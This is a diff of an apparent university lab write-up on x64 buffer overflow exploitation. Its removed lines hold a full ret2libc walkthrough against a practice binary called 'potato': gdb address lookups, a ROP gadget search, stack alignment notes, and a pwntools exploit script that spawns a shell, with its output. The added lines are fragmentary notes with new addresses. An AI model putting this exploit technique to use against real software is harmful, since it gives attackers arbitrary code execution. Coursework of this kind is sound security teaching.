@@ -366,177 +366,26 @@ We can clearly see that we are no longer bound to the executed program but rathe
 
 **TODO**
 
-The 'Return to LibC' attack or `ret2libc` for short is a little more complicated to execute on a x64 system than on a x32 system.
-The basic idea of `ret2libc`is to not inject sehllcode into the buffer and execute our buffer but rather find exisiting linked libc functions we can use to spawn our shell. This may be necessary because the stack of our application might not be executable.
+`vmmap` heap range `find 0x0000000000408000, 0x0000000000428fff, "/bin/sh"`.
 
-To sucessfully perform a `ret2libc` attack on a x64 system the following steps were perfomred.
+```bash
+0x4088c7
+0x409d9e
+```
 
-First we needed to find the libc functions `system()` and `exit()` which will be used to spawn our shell child-process. Finding these functions with gdb worked with the following commands.
+```bash
+gef➤  x/8bx 0x409d9e
+0x409d9e:	0x2f	0x62	0x69	0x6e	0x2f	0x73	0x68	0x00
+```
 
 ```bash
 gef➤  p system
-$3 = {int (const char *)} 0x155554c5c8f0 <__libc_system>
+$3 = {int (const char *)} 0x155554a58750 <__libc_system>
 ```
 
 ```bash
 gef➤  p exit
-$5 = {void (int)} 0x155554c4c280 <__GI_exit>
-```
-
-Next we needed to find a `/bin/sh` string in our application to pass to the `system()` function as an argument. For this we searched the string in the applications heap space.
-
-First we needed to identify the heap range with `vmmap` in gdb.
-
-```bash
-───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
-gef➤  vmmap
-[ Legend:  Code | Stack | Heap ]
-Start              End                Offset             Perm Path
-
-[ommitted for better readability]
-
-0x0000000000408000 0x0000000000429000 0x0000000000000000 rw- [heap]
-
-[ommitted for better readability]
-
-```
-
-We can se the addresses of the heap range from `0x0000000000408000` to `0x0000000000429000`. To find a `/bin/sh` string the following command was executed in gdb.
-
-```bash
-gef➤  find 0x0000000000408000, 0x0000000000429000-1, "/bin/sh"
-0x4088c7
-0x409d9e
-2 patterns found.
-```
-
-Any of these two addresses can be used as an argument for `system()`. If we examine the address we can see the bytes in hex representation of the `/bin/sh` string. The string could be made visible by converting the hex to ascii characters, this isn't necessary for the next steps.
-
-```bash
-gef➤  x/8bx 0x4088c7
-0x4088c7:	0x2f	0x62	0x69	0x6e	0x2f	0x73	0x68	0x00
-```
-
-To execute the `system()` function we need to pass it an argument. Consulting the [man pages for syscall](https://man7.org/linux/man-pages/man2/syscall.2.html) shows in the following table that arguments for syscalls need to be passed via certain registers. Interesting for this attack is the first argument so the `rdi` register.
-
-
-```bash
-The second table shows the registers used to pass the system call arguments.
-       Arch/ABI      arg1  arg2  arg3  arg4  arg5  arg6  arg7  Notes
-       ──────────────────────────────────────────────────────────────
-          [omitted for readability]
-       x86-64        rdi   rsi   rdx   r10   r8    r9    -
-       x32           rdi   rsi   rdx   r10   r8    r9    -
-          [omitted for readability]
-```
-
-To set a value to the `rdi` register a little trick with a ROP gadget was used. By first using a ROP gadget that executes `pop rdi ; ret` the next value on the stack will be written to `rdi`. To find a ROP gadget the ROPgadget python tool was used to scan the linked libc library for a fitting gadget.
-
-First the used libc library is identified with `ldd`.
-
-```bash
-$ ldd potato
-        [omitted for readability]
-        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff780a000)
-        [omitted for readability]
-```
-
-Then the ROP gadget is identified by scanning the linked libc library.
-
-```bash
-$ ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
-0x000000000002a205 : pop rdi ; ret
-```
-
-This address is not the final usable address but an offset we need to add to the libc addresses in our programs memory space. To identify the base address of the libcs memory space we can use `vmmap` in gdb.
-
-```bash
-gef➤  vmmap
-[ Legend:  Code | Stack | Heap ]
-Start              End                Offset             Perm Path
-[omitted for readability]
-0x0000155554c0a000 0x0000155554c32000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
-[omitted for readability]
-```
-With the base address `0x0000155554c0a000` and the offset `0x000000000002a205` we can calculate the final address of the gadget
-`gadgetAddress = baseAddress + gadgetOffset`. This resulted in `0x0000155554c34205`.
-
-Finally the stack needed to be aligned to execute this attack. This basically means the address in `$rsp` at the time of the `ret` statement of our vulnerable function needed to end on `0x...0`. If the stack is not aligned at the time of the attack, the attack will fail with a `Segmentation Fault`. To align the stack a `dummy ret` statement was the first statement to be executed with the attack. This lead to the previous unaligned stack with an address of `0x...8` in `$rsp` to realign itself. The `ret` statement can be any available statement at the time of execution. Four this attack the `ret` statment of the vulnerable function was simply executed twice, with the statments address at `0x4040e4`
-
-With this knowledge the following attack script could be crafted.
-
-
-```Python
-#!/usr/bin/env python3
-
-from pwn import *
-import sys
-
-# Addresses of libc functions system() and exit()
-SYSTEM = 0x155554c5c8f0
-EXIT = 0x155554c4c280
-
-# Address of 'pop rdi ; ret' statement for setting rdi value which will be used as input for system()
-# Address of dummy 'ret' statement (dummy in this case means any single ret statement) for stack alignment
-POP_RDI = 0x155554c34205
-DUMMY_RET = 0x4040e4
-
-# Address of '/bin/sh' string from heap to use as argument for system()
-BIN_SH = 0x4088c7
-
-elf = ELF("./potato")
-
-p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
-gdb.attach(p, '''
-break func.c:192
-continue
-''')
-
-# Login with test user
-print(p.recvuntil(b"cmd> "))
-p.sendline(b"login")
-p.sendline(b"peter") # username
-p.sendline(b"12345") # password
-print(p.recvuntil(b"cmd> "))
-
-# Call of vulnerable function change_name()
-p.sendline(b"changename")
-
-# Payload for Ret2LibC attack
-payload = b''.join([b'\x41'*72, p64(DUMMY_RET), p64(POP_RDI), p64(BIN_SH), p64(SYSTEM), p64(EXIT)])
-
-p.sendline(payload)
-
-p.interactive()
-```
-
-Executing the script lead to the spawning of a shell with the rights of the programs executor, in this case the user `kali`.
-
-```bash
-$ python3 libc.py
-[*] '/home/kali/workspace/ITS_FHCAMPUS/Semester_2/Cyber_Security_ILV/uebung_2/potato'
-    Arch:       amd64-64-little
-    RELRO:      Partial RELRO
-    Stack:      No canary found
-    NX:         NX unknown - GNU_STACK missing
-    PIE:        No PIE (0x400000)
-    Stack:      Executable
-    RWX:        Has RWX segments
-    Stripped:   No
-    Debuginfo:  Yes
-[+] Starting local process '/home/kali/workspace/ITS_FHCAMPUS/Semester_2/Cyber_Security_ILV/uebung_2/potato': pid 205369
-[!] ASLR is disabled!
-[*] running in new terminal: ['/usr/bin/gdb', '-q', '/home/kali/workspace/ITS_FHCAMPUS/Semester_2/Cyber_Security_ILV/uebung_2/potato', '-p', '205369', '-x', '/tmp/pwnlib-gdbscript-gmf97z_c.gdb']
-[+] Waiting for debugger: Done
-b'starting up (pid 205369)\nreading file userlist\nhandle_client\ncmd> '
-b'Welcome!\nusername: password: searching for user ...\nchecking password ...\nYou are authorized.\n\ncmd> '
-[*] Switching to interactive mode
-What is the name > Name changed.
-$ $ whoami
-kali
-$ $ id -a
-uid=1000(kali) gid=1000(kali) Gruppen=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),116(bluetooth),121(wireshark),123(lpadmin),129(scanner),134(kaboxer)
-$ $  
+$5 = {void (int)} 0x155554a47ba0 <__GI_exit>
 ```
 
 ### Custom shellcode or ROP chain
